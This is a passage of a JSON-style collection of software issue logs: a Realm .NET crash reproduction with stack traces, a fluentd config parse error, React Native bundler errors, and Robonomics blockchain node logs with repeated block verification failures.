-1\r\npostscreen_greet_action = enforce\r\npostscreen_bare_newline_action = enforce"
    },
    {
        "logs": "[ ] Bugfix\r\n[x] Feature\r\n[ ] Code style update (formatting, local variables)\r\n[ ] Refactoring (no functional changes, no api changes)\r\n[ ] Build related changes\r\n[ ] CI related changes\r\n[ ] Documentation content changes\r\n[ ] Application (the showcase website) / infrastructure changes\r\n[ ] Other... Please describe:"
    },
    {
        "logs": "        public class Tst1 : RealmObject\r\n        {\r\n            [PrimaryKey]\r\n            public string Id { get; set; }\r\n        }\r\n        private void Form1_Load(object sender, EventArgs e)\r\n        {\r\n            var config = new RealmConfiguration(Path.GetTempFileName())\r\n            {\r\n            };\r\n            var realm = Realm.GetInstance(config);\r\n            realm.All<Tst1>().SubscribeForNotifications(Changed);\r\n\r\n            var r = Realm.GetInstance(config);\r\n            var tst1 = new Tst1()\r\n            {\r\n                Id = \"1\"\r\n            };\r\n            r.Write(() =>\r\n            {\r\n                r.Add(tst1);\r\n            });\r\n            realm.Refresh();\r\n\r\n            r.Write(() =>\r\n            {\r\n                r.Remove(tst1);\r\n            });\r\n            realm.Refresh();\r\n        }\r\n\r\n\r\n        private void Changed(IRealmCollection<Tst1> sender, ChangeSet changes, Exception error)\r\n        {\r\n            if (changes == null)\r\n                return;\r\n\r\n            foreach (int changesDeletedIndex in changes.DeletedIndices)\r\n            {\r\n                var z = sender[changesDeletedIndex];\r\n                Console.WriteLine(z.Id); //here goes the AccessViolationException\r\n            }\r\n        }"
    },
    {
        "logs": "   at Realms.ObjectHandle.NativeMethods.get_string(ObjectHandle handle, IntPtr propertyIndex, IntPtr buffer, IntPtr bufsize, Boolean& isNull, NativeException& ex)\r\n   at Realms.ObjectHandle.<>c__DisplayClass13_0.<GetString>b__0(IntPtr buffer, IntPtr length, Boolean& isNull, NativeException& ex) in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\Handles\\ObjectHandle.cs:line 284\r\n   at Realms.MarshalHelpers.GetString(NativeStringGetter getter) in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\MarshalHelpers.cs:line 116\r\n   at Realms.ObjectHandle.GetString(IntPtr propertyIndex) in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\Handles\\ObjectHandle.cs:line 284\r\n   at Realms.RealmObject.GetStringValue(String propertyName) in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\RealmObject.cs:line 153\r\n   at RealmWin.Form1.Tst1.get_Id() in C:\\DiskD\\Projects\\RealmWin\\RealmWin\\Form1.cs:line 25\r\n   at RealmWin.Form1.Changed(IRealmCollection"
    },
    {
        "logs": "1 exception) in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\RealmCollectionBase.cs:line 319\r\n   at Realms.RealmCollectionNativeHelper.NotificationCallbackImpl(IntPtr managedResultsHandle, IntPtr changes, IntPtr exception) in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\Linq\\RealmCollectionNativeHelper.cs:line 38\r\n   at Realms.SharedRealmHandle.NativeMethods.refresh(SharedRealmHandle sharedRealm, NativeException& ex)\r\n   at Realms.SharedRealmHandle.Refresh() in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\Handles\\SharedRealmHandle.cs:line 184\r\n   at Realms.Realm.Refresh() in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\Realm.cs:line 762\r\n   at RealmWin.Form1.Form1_Load(Object sender, EventArgs e) in C:\\DiskD\\Projects\\RealmWin\\RealmWin\\Form1.cs:line 56\r\n   at System.Windows.Forms.Form.OnLoad(EventArgs e)\r\n   at System.Windows.Forms.Form.OnCreateControl()\r\n   at System.Windows.Forms.Control.CreateControl(Boolean fIgnoreVisible)\r\n   at System.Windows.Forms.Control.CreateControl()\r\n   at System.Windows.Forms.Control.WmShowWindow(Message& m)\r\n   at System.Windows.Forms.Control.WndProc(Message& m)\r\n   at System.Windows.Forms.ScrollableControl.WndProc(Message& m)\r\n   at System.Windows.Forms.Form.WmShowWindow(Message& m)\r\n   at System.Windows.Forms.Form.WndProc(Message& m)\r\n   at System.Windows.Forms.Control.ControlNativeWindow.OnMessage(Message& m)\r\n   at System.Windows.Forms.Control.ControlNativeWindow.WndProc(Message& m)\r\n   at System.Windows.Forms.NativeWindow.DebuggableCallback(IntPtr hWnd, Int32 msg, IntPtr wparam, IntPtr lparam)"
    },
    {
        "logs": "        public class Tst1 : RealmObject\r\n        {\r\n            [PrimaryKey]\r\n            public string Id { get; set; }\r\n        }\r\n        private void Form1_Load(object sender, EventArgs e)\r\n        {\r\n            var config = new RealmConfiguration(Path.GetTempFileName())\r\n            {\r\n            };\r\n            var realm = Realm.GetInstance(config);\r\n            realm.All<Tst1>().SubscribeForNotifications(Changed);\r\n\r\n            var r = Realm.GetInstance(config);\r\n            var tst1 = new Tst1()\r\n            {\r\n                Id = \"1\"\r\n            };\r\n            r.Write(() =>\r\n            {\r\n                r.Add(tst1);\r\n            });\r\n            realm.Refresh();\r\n\r\n            r.Write(() =>\r\n            {\r\n                r.Remove(tst1);\r\n            });\r\n            realm.Refresh();\r\n        }\r\n\r\n\r\n        private void Changed(IRealmCollection<Tst1> sender, ChangeSet changes, Exception error)\r\n        {\r\n            if (changes == null)\r\n                return;\r\n\r\n            foreach (int changesDeletedIndex in changes.DeletedIndices)\r\n            {\r\n                var z = sender[changesDeletedIndex];\r\n                Console.WriteLine(z.Id); //here goes the AccessViolationException\r\n            }\r\n        }"
    },
    {
        "logs": "   at Realms.ObjectHandle.NativeMethods.get_string(ObjectHandle handle, IntPtr propertyIndex, IntPtr buffer, IntPtr bufsize, Boolean& isNull, NativeException& ex)\r\n   at Realms.ObjectHandle.<>c__DisplayClass13_0.<GetString>b__0(IntPtr buffer, IntPtr length, Boolean& isNull, NativeException& ex) in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\Handles\\ObjectHandle.cs:line 284\r\n   at Realms.MarshalHelpers.GetString(NativeStringGetter getter) in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\MarshalHelpers.cs:line 116\r\n   at Realms.ObjectHandle.GetString(IntPtr propertyIndex) in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\Handles\\ObjectHandle.cs:line 284\r\n   at Realms.RealmObject.GetStringValue(String propertyName) in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\RealmObject.cs:line 153\r\n   at RealmWin.Form1.Tst1.get_Id() in C:\\DiskD\\Projects\\RealmWin\\RealmWin\\Form1.cs:line 25\r\n   at RealmWin.Form1.Changed(IRealmCollection`1 sender, ChangeSet changes, Exception error) in C:\\DiskD\\Projects\\RealmWin\\RealmWin\\Form1.cs:line 68\r\n   at Realms.RealmCollectionBase`1.Realms.RealmCollectionNativeHelper.Interface.NotifyCallbacks(Nullable`1 changes, Nullable`1 exception) in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\RealmCollectionBase.cs:line 319\r\n   at Realms.RealmCollectionNativeHelper.NotificationCallbackImpl(IntPtr managedResultsHandle, IntPtr changes, IntPtr exception) in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\Linq\\RealmCollectionNativeHelper.cs:line 38\r\n   at Realms.SharedRealmHandle.NativeMethods.refresh(SharedRealmHandle sharedRealm, NativeException& ex)\r\n   at Realms.SharedRealmHandle.Refresh() in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\Handles\\SharedRealmHandle.cs:line 184\r\n   at Realms.Realm.Refresh() in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\Realm.cs:line 762\r\n   at RealmWin.Form1.Form1_Load(Object sender, EventArgs e) in C:\\DiskD\\Projects\\RealmWin\\RealmWin\\Form1.cs:line 56\r\n   at System.Windows.Forms.Form.OnLoad(EventArgs e)\r\n   at System.Windows.Forms.Form.OnCreateControl()\r\n   at System.Windows.Forms.Control.CreateControl(Boolean fIgnoreVisible)\r\n   at System.Windows.Forms.Control.CreateControl()\r\n   at System.Windows.Forms.Control.WmShowWindow(Message& m)\r\n   at System.Windows.Forms.Control.WndProc(Message& m)\r\n   at System.Windows.Forms.ScrollableControl.WndProc(Message& m)\r\n   at System.Windows.Forms.Form.WmShowWindow(Message& m)\r\n   at System.Windows.Forms.Form.WndProc(Message& m)\r\n   at System.Windows.Forms.Control.ControlNativeWindow.OnMessage(Message& m)\r\n   at System.Windows.Forms.Control.ControlNativeWindow.WndProc(Message& m)\r\n   at System.Windows.Forms.NativeWindow.DebuggableCallback(IntPtr hWnd, Int32 msg, IntPtr wparam, IntPtr lparam)"
    },
    {
        "logs": "Jun 18 09:16:29 fluentd1 fluentd[5467]: /opt/td-agent/embedded/lib/ruby/gems/2.4.0/gems/fluentd-1.3.3/lib/fluent/config/basic_parser.rb:92:in `parse_error!': unexpected back-slash escape character 'x' at main.conf line 83,24 (Fluent::ConfigParseError)\r\nJun 18 09:16:29 fluentd1 fluentd[5467]:  82:            @type csv\r\nJun 18 09:16:29 fluentd1 fluentd[5467]:  83:            delimiter \"\\x31\"\r\nJun 18 09:16:29 fluentd1 fluentd[5467]:      ------------------------^"
    },
    {
        "logs": "The development server returned response error code: 500\r\n\r\nURL: http://10.0.2.2:8081/index.delta?platform=android&dev=true&minify=false\r\n\r\nBody:\r\n{\"originModulePath\":\"/Users/admin/Desktop/rn59/node_modules/istanbul-reports/index.js\",\"targetModuleName\":\"path\",\"message\":\"Unable to resolve module "
    },
    {
        "logs": " does not exist in the Haste module map\\n\\nThis might be related to https://github.com/facebook/react-native/issues/4968\\nTo resolve try the following:\\n  1. Clear watchman watches: "
    },
    {
        "logs": " does not exist in the Haste module map\\n\\nThis might be related to https://github.com/facebook/react-native/issues/4968\\nTo resolve try the following:\\n  1. Clear watchman watches: "
    },
    {
        "logs": " does not exist in the Haste module map\\n\\nThis might be related to https://github.com/facebook/react-native/issues/4968\\nTo resolve try the following:\\n  1. Clear watchman watches: "
    },
    {
        "logs": "-> % systemctl status robonomics_testNet.service \r\n\u25cf robonomics_testNet.service - robonomics service\r\n   Loaded: loaded (/etc/systemd/system/robonomics_testNet.service; enabled; vendor preset: enabled)\r\n   Active: active (running) since Sun 2020-09-27 13:50:16 UTC; 1 day 7h ago\r\n Main PID: 730 (robonomics)\r\n    Tasks: 47 (limit: 1151)\r\n   CGroup: /system.slice/robonomics_testNet.service\r\n           \u2514\u2500730 /usr/bin/robonomics --chain parachain --name ijn15 | 0x283B4163bA8c0E18b75713674e11e25FA1AD83f8\r\n\r\nSep 28 21:02:58 ubuntu15 robonomics[730]: 2020-09-28 21:02:58 \ud83d\udca4 [Relaychain] Idle (6 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 14.1kiB/s \u2b06 5.2kiB/s\r\nSep 28 21:03:01 ubuntu15 robonomics[730]: 2020-09-28 21:03:01 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWAF\r\nSep 28 21:03:01 ubuntu15 robonomics[730]: 2020-09-28 21:03:01 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWB8\r\nSep 28 21:03:02 ubuntu15 robonomics[730]: 2020-09-28 21:03:02 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 3.7kiB/s \u2b06 3.8kiB/s\r\nSep 28 21:03:03 ubuntu15 robonomics[730]: 2020-09-28 21:03:03 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWPP\r\nSep 28 21:03:03 ubuntu15 robonomics[730]: 2020-09-28 21:03:03 \u2699\ufe0f  [Relaychain] Syncing  0.0 bps, target=#775773 (8 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 35.3ki\r\nSep 28 21:03:04 ubuntu15 robonomics[730]: 2020-09-28 21:03:04 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWJc\r\nSep 28 21:03:05 ubuntu15 robonomics[730]: 2020-09-28 21:03:05 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWG1\r\nSep 28 21:03:07 ubuntu15 robonomics[730]: 2020-09-28 21:03:07 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 4.3kiB/s \u2b06 4.3kiB/s"
    },
    {
        "logs": "Sep 28 21:09:36 ubuntu15 robonomics[730]: 2020-09-28 21:09:36 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWAFH1GqtxWvaxxwkunPH4frZMV2qDQKbV8i21AYkWY5UU, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:09:38 ubuntu15 robonomics[730]: 2020-09-28 21:09:38 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 3.7kiB/s \u2b06 3.7kiB/s\r\nSep 28 21:09:39 ubuntu15 robonomics[730]: 2020-09-28 21:09:39 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWL3ycav71QcaKCvU8FmpozpwnEzGhpjGnCuBXZkZJEHLF, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:09:39 ubuntu15 robonomics[730]: 2020-09-28 21:09:39 \u2699\ufe0f  [Relaychain] Syncing  0.0 bps, target=#775794 (8 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 24.2kiB/s \u2b06 7.4kiB/s\r\nSep 28 21:09:41 ubuntu15 robonomics[730]: 2020-09-28 21:09:41 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWG18SW2KouBaSrCenxUKotmLPqag3WMJmunFLaJHpEXTs, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:09:43 ubuntu15 robonomics[730]: 2020-09-28 21:09:43 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 4.1kiB/s \u2b06 3.8kiB/s\r\nSep 28 21:09:43 ubuntu15 robonomics[730]: 2020-09-28 21:09:43 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWLMwUNrt2RNKjJqcPmDUh9ucLyZ7h1nGcQ9Ww2ZLMFABW, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:09:44 ubuntu15 robonomics[730]: 2020-09-28 21:09:44 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWPmFKA2NC2KNckiA3T29cxRQMVwEHAexqaeNTjyDV7PsQ, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:09:44 ubuntu15 robonomics[730]: 2020-09-28 21:09:44 \u2699\ufe0f  [Relaychain] Syncing  0.0 bps, target=#775305 (7 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 34.3kiB/s \u2b06 8.3kiB/s\r\nSep 28 21:09:48 ubuntu15 robonomics[730]: 2020-09-28 21:09:48 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 3.8kiB/s \u2b06 4.0kiB/s\r\nSep 28 21:09:49 ubuntu15 robonomics[730]: 2020-09-28 21:09:49 \u2699\ufe0f  [Relaychain] Syncing  0.0 bps, target=#775305 (7 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 3.2kiB/s \u2b06 3.2kiB/s\r\nSep 28 21:09:53 ubuntu15 robonomics[730]: 2020-09-28 21:09:53 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 4.8kiB/s \u2b06 4.6kiB/s\r\nSep 28 21:09:54 ubuntu15 robonomics[730]: 2020-09-28 21:09:54 \u2699\ufe0f  [Relaychain] Syncing  0.0 bps, target=#775305 (7 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 3.4kiB/s \u2b06 3.8kiB/s\r\nSep 28 21:09:58 ubuntu15 robonomics[730]: 2020-09-28 21:09:58 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 4.0kiB/s \u2b06 4.1kiB/s\r\nSep 28 21:09:59 ubuntu15 robonomics[730]: 2020-09-28 21:09:59 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWSPayd1AVbkQnoKNY31ct7REiME9F7Bi1Sy4ByZMKghZT, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:09:59 ubuntu15 robonomics[730]: 2020-09-28 21:09:59 \u2699\ufe0f  [Relaychain] Syncing  0.0 bps, target=#775305 (7 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 15.0kiB/s \u2b06 6.2kiB/s\r\nSep 28 21:10:00 ubuntu15 robonomics[730]: 2020-09-28 21:10:00 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWBBwauXVbCC3TvGvynyi58AwRZSGGLx7KBoKFfcfEbhHD, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:10:01 ubuntu15 robonomics[730]: 2020-09-28 21:10:01 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWGqrUyhEt4yPPSbGxosjLjdYWjkgJkusM135Tvm1a35AF, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\""
    },
    {
        "logs": "-> % systemctl status robonomics_testNet.service \r\n\u25cf robonomics_testNet.service - robonomics service\r\n   Loaded: loaded (/etc/systemd/system/robonomics_testNet.service; enabled; vendor preset: enabled)\r\n   Active: active (running) since Sun 2020-09-27 13:50:16 UTC; 1 day 7h ago\r\n Main PID: 730 (robonomics)\r\n    Tasks: 47 (limit: 1151)\r\n   CGroup: /system.slice/robonomics_testNet.service\r\n           \u2514\u2500730 /usr/bin/robonomics --chain parachain --name ijn15 | 0x283B4163bA8c0E18b75713674e11e25FA1AD83f8\r\n\r\nSep 28 21:02:58 ubuntu15 robonomics[730]: 2020-09-28 21:02:58 \ud83d\udca4 [Relaychain] Idle (6 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 14.1kiB/s \u2b06 5.2kiB/s\r\nSep 28 21:03:01 ubuntu15 robonomics[730]: 2020-09-28 21:03:01 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWAF\r\nSep 28 21:03:01 ubuntu15 robonomics[730]: 2020-09-28 21:03:01 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWB8\r\nSep 28 21:03:02 ubuntu15 robonomics[730]: 2020-09-28 21:03:02 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 3.7kiB/s \u2b06 3.8kiB/s\r\nSep 28 21:03:03 ubuntu15 robonomics[730]: 2020-09-28 21:03:03 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWPP\r\nSep 28 21:03:03 ubuntu15 robonomics[730]: 2020-09-28 21:03:03 \u2699\ufe0f  [Relaychain] Syncing  0.0 bps, target=#775773 (8 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 35.3ki\r\nSep 28 21:03:04 ubuntu15 robonomics[730]: 2020-09-28 21:03:04 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWJc\r\nSep 28 21:03:05 ubuntu15 robonomics[730]: 2020-09-28 21:03:05 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWG1\r\nSep 28 21:03:07 ubuntu15 robonomics[730]: 2020-09-28 21:03:07 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 4.3kiB/s \u2b06 4.3kiB/s"
    },
    {
        "logs": "Sep 28 21:09:36 ubuntu15 robonomics[730]: 2020-09-28 21:09:36 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWAFH1GqtxWvaxxwkunPH4frZMV2qDQKbV8i21AYkWY5UU, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:09:38 ubuntu15 robonomics[730]: 2020-09-28 21:09:38 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 3.7kiB/s \u2b06 3.7kiB/s\r\nSep 28 21:09:39 ubuntu15 robonomics[730]: 2020-09-28 21:09:39 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWL3ycav71QcaKCvU8FmpozpwnEzGhpjGnCuBXZkZJEHLF, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:09:39 ubuntu15 robonomics[730]: 2020-09-28 21:09:39 \u2699\ufe0f  [Relaychain] Syncing  0.0 bps, target=#775794 (8 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 24.2kiB/s \u2b06 7.4kiB/s\r\nSep 28 21:09:41 ubuntu15 robonomics[730]: 2020-09-28 21:09:41 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWG18SW2KouBaSrCenxUKotmLPqag3WMJmunFLaJHpEXTs, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:09:43 ubuntu15 robonomics[730]: 2020-09-28 21:09:43 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 4.1kiB/s \u2b06 3.8kiB/s\r\nSep 28 21:09:43 ubuntu15 robonomics[730]: 2020-09-28 21:09:43 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWLMwUNrt2RNKjJqcPmDUh9ucLyZ7h1nGcQ9Ww2ZLMFABW, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:09:44 ubuntu15 robonomics[730]: 2020-09-28 21:09:44 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWPmFKA2NC2KNckiA3T29cxRQMVwEHAexqaeNTjyDV7PsQ, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:09:44 ubuntu15 robonomics[730]: 2020-09-28 21:09:44 \u2699\ufe0f  [Relaychain] Syncing  0.0 bps, target=#775305 (7 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 34.3kiB/s \u2b06 8.3kiB/s\r\nSep 28 21:09:48 ubuntu15 robonomics[730]: 2020-09-28 21:09:48 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 3.8kiB/s \u2b06 4.0kiB/s\r\nSep 28 21:09:49 ubuntu15 robonomics[730]: 2020-09-28 21:09:49 \u2699\ufe0f  [Relaychain] Syncing  0.0 bps, target=#775305 (7 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 3.2kiB/s \u2b06 3.2kiB/s\r\nSep 28 21:09:53 ubuntu15 robonomics[730]: 2020-09-28 21:09:53 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 4.8kiB/s \u2b06 4.6kiB/s\r\nSep 28 21:09:54 ubuntu15 robonomics[730]: 2020-09-28 21:09:54 \u2699\ufe0f  [Relaychain] Syncing  0.0 bps, target=#775305 (7 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 3.4kiB/s \u2b06 3.8kiB/s\r\nSep 28 21:09:58 ubuntu15 robonomics[730]: 2020-09-28 21:09:58 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 4.0kiB/s \u2b06 4.1kiB/s\r\nSep 28 21:09:59 ubuntu15 robonomics[730]: 2020-09-28 21:09:59 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 